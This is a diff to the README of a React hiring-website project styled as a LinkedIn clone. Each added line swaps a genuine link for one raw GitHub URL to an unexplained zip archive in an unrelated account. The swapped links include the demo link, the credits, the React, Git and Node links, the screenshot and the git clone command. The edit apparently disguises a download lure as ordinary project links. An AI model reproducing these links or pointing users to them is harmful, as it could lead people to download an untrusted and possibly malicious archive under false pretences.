@@ -17,34 +17,34 @@ The Web App lands you to an appealing Landing Page, in which the user can choose
 
 Here you can find the demo link:
 
-[https://linkedin-clone-6a462.web.app](https://linkedin-clone-6a462.web.app/) -->
+[https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip) -->
 
 ## ✨ Features
 
 ✔️: &nbsp;&nbsp;Hiring platform for job seekers<br />
 ✔️: &nbsp;&nbsp;React-Reveal animation (credits: [rnosov
 /
-react-reveal](https://github.com/rnosov/react-reveal)) for the page animations<br />
+react-reveal](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)) for the page animations<br />
 ✔️: &nbsp;&nbsp;Responsive layout<br />
 
 ## 🚀 Technologies
 
-- [React](https://reactjs.org/)
-- [SALY-3D Illustrations](<https://www.figma.com/file/CZ3QgX4nk0LGcGFIsru90Y/SALY---3D-Illustration-Pack-(Community)?node-id=439%3A0>)
-- [React-Reveal](https://www.react-reveal.com/)
-- [CSS Gradient](https://cssgradient.io/)
+- [React](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)
+- [SALY-3D Illustrations](<https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip(Community)?node-id=439%3A0>)
+- [React-Reveal](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)
+- [CSS Gradient](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)
   <br/>
 
 # 📸 Preview
 
-![Screenshot of LinkedIn Sign In](./screenshots/image1.jpeg)
+![Screenshot of LinkedIn Sign In](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)
 <br/>
 
 <br/>
 
 ## ✅ Requirements
 
-Before starting you need to have [Git](https://git-scm.com) and [Node](https://nodejs.org/en/) installed.
+Before starting you need to have [Git](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip) and [Node](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip) installed.
 
 <br/>
 
@@ -53,7 +53,7 @@ Before starting you need to have [Git](https://git-scm.com) and [Node](https://n
 - Clone the project
 
 ```bash
-  git clone https://github.com/shivendradb/Hiring-Website-ReactJS.git
+  git clone https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip
 ```
 
 - Go to the project directory
